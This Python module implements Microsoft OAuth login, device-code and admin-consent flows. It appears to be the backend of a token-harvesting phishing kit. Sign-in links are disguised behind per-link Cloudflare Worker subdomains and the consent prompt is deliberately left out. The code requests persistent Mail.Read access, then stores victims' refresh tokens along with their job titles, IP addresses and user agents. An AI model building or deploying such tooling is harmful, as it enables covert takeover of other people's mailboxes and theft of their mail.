import os
import requests
from urllib.parse import urlencode, quote_plus
from datetime import datetime, timedelta
from db import SessionLocal
from models import TenantToken, TenantConsent, TenantConsentStatus
import uuid

# =========================
# CONFIG
# =========================
CLIENT_ID = os.getenv("CLIENT_ID")
CLIENT_SECRET = os.getenv("CLIENT_SECRET")
REDIRECT_URI = os.getenv("REDIRECT_URI")

AUTHORIZE_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize"
TOKEN_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
DEVICE_CODE_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode"

GRAPH_SCOPES = "User.Read Mail.Read offline_access"

WORKER_DOMAIN = os.getenv("WORKER_DOMAIN")  # e.g. dorseym410.workers.dev

# =========================
# CLOUDFLARE WRAPPER
# =========================
def wrap_with_cloudflare_worker(target_url: str, link_token: str | None = None):
    if not WORKER_DOMAIN:
        return target_url

    token = link_token or str(uuid.uuid4())
    subdomain = f"{token}.{WORKER_DOMAIN}"

    return f"https://{subdomain}?target={quote_plus(target_url)}"


# =========================
# AUTHORIZE URL (NO PROMPT)
# =========================
def build_authorize_url(state_value: str, link_token: str | None = None):
    params = {
        "client_id": CLIENT_ID,
        "response_type": "code",
        "redirect_uri": REDIRECT_URI,
        "response_mode": "query",
        "scope": GRAPH_SCOPES,
        "state": quote_plus(state_value)
        # 🚫 NO prompt parameter
    }

    raw_url = f"{AUTHORIZE_URL}?{urlencode(params)}"
    return wrap_with_cloudflare_worker(raw_url, link_token)


# =========================
# LOGIN LINK
# =========================
def generate_login_link(user_id: str):
    state = f"{user_id}:{uuid.uuid4()}"
    return build_authorize_url(state)


# =========================
# ORG CONNECT LINK
# =========================
def generate_org_connect_link(admin_user_id: str):
    state = f"org:{admin_user_id}:{uuid.uuid4()}"
    return build_authorize_url(state)


# =========================
# ADMIN CONSENT URL
# =========================
def generate_admin_consent_url(tenant: str | None = None):
    tenant = tenant or "organizations"

    params = {
        "client_id": CLIENT_ID,
        "redirect_uri": REDIRECT_URI,
    }

    return f"https://login.microsoftonline.com/{tenant}/adminconsent?{urlencode(params)}"


# =========================
# TOKEN EXCHANGE
# =========================
def exchange_code_for_token(code: str, state: str, ip=None, user_agent=None):
    db = SessionLocal()

    try:
        parts = state.split(":")
        user_id = parts[0]

        data = {
            "client_id": CLIENT_ID,
            "scope": GRAPH_SCOPES,
            "code": code,
            "redirect_uri": REDIRECT_URI,
            "grant_type": "authorization_code",
            "client_secret": CLIENT_SECRET,
        }

        response = requests.post(TOKEN_URL, data=data)
        token_data = response.json()

        if "access_token" not in token_data:
            raise Exception(f"Token error: {token_data}")

        access_token = token_data["access_token"]

        # =========================
        # FETCH USER PROFILE (JOB TITLE)
        # =========================
        profile = requests.get(
            "https://graph.microsoft.com/v1.0/me",
            headers={"Authorization": f"Bearer {access_token}"}
        ).json()

        job_title = profile.get("jobTitle")
        email = profile.get("mail") or profile.get("userPrincipalName")

        # =========================
        # SAVE TOKEN
        # =========================
        expires_at = int(datetime.utcnow().timestamp()) + token_data.get("expires_in", 3600)

        existing = db.query(TenantToken).filter_by(tenant_id=user_id).first()

        if existing:
            existing.access_token = access_token
            existing.refresh_token = token_data.get("refresh_token")
            existing.expires_at = expires_at
            existing.user_agent = user_agent
            existing.ip_address = ip
            existing.job_title = job_title
        else:
            db.add(TenantToken(
                tenant_id=user_id,
                access_token=access_token,
                refresh_token=token_data.get("refresh_token"),
                expires_at=expires_at,
                user_agent=user_agent,
                ip_address=ip,
                job_title=job_title
            ))

        db.commit()

        print(f"✅ Login success: {email} ({job_title})")

        return token_data

    finally:
        db.close()


# =========================
# GET TOKEN
# =========================
def get_token(user_id: str):
    db = SessionLocal()
    try:
        return db.query(TenantToken).filter_by(tenant_id=user_id).first()
    finally:
        db.close()


# =========================
# DEVICE CODE FLOW
# =========================
def start_device_code_flow():
    data = {
        "client_id": CLIENT_ID,
        "scope": GRAPH_SCOPES
    }

    response = requests.post(DEVICE_CODE_URL, data=data)
    return response.json()


def poll_device_code_flow(device_code: str, admin_user_id=None, client_ip=None, user_agent=None):
    db = SessionLocal()

    try:
        data = {
            "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
            "client_id": CLIENT_ID,
            "device_code": device_code,
        }

        response = requests.post(TOKEN_URL, data=data)
        token_data = response.json()

        if "error" in token_data:
            return {"status": "pending", "detail": token_data.get("error")}

        access_token = token_data["access_token"]

        profile = requests.get(
            "https://graph.microsoft.com/v1.0/me",
            headers={"Authorization": f"Bearer {access_token}"}
        ).json()

        user_id = profile.get("userPrincipalName")
        job_title = profile.get("jobTitle")

        expires_at = int(datetime.utcnow().timestamp()) + token_data.get("expires_in", 3600)

        existing = db.query(TenantToken).filter_by(tenant_id=user_id).first()

        if existing:
            existing.access_token = access_token
            existing.refresh_token = token_data.get("refresh_token")
            existing.expires_at = expires_at
            existing.job_title = job_title
        else:
            db.add(TenantToken(
                tenant_id=user_id,
                access_token=access_token,
                refresh_token=token_data.get("refresh_token"),
                expires_at=expires_at,
                job_title=job_title
            ))

        db.commit()

        return {
            "status": "complete",
            "resolved_user_id": user_id,
            "job_title": job_title
        }

    finally:
        db.close()


# =========================
# TENANT CONSENT SAVE
# =========================
def save_or_update_tenant_consent(admin_user_id, tenant_hint, admin_consent_url=None, status=None, notes=None):
    db = SessionLocal()

    try:
        existing = db.query(TenantConsent).filter_by(
            admin_user_id=admin_user_id,
            tenant_hint=tenant_hint
        ).first()

        if existing:
            if admin_consent_url:
                existing.admin_consent_url = admin_consent_url
            if status:
                existing.status = status
            if notes:
                existing.notes = notes
        else:
            db.add(TenantConsent(
                admin_user_id=admin_user_id,
                tenant_hint=tenant_hint,
                admin_consent_url=admin_consent_url,
                status=status or TenantConsentStatus.PENDING,
                notes=notes
            ))

        db.commit()

    finally:
        db.close()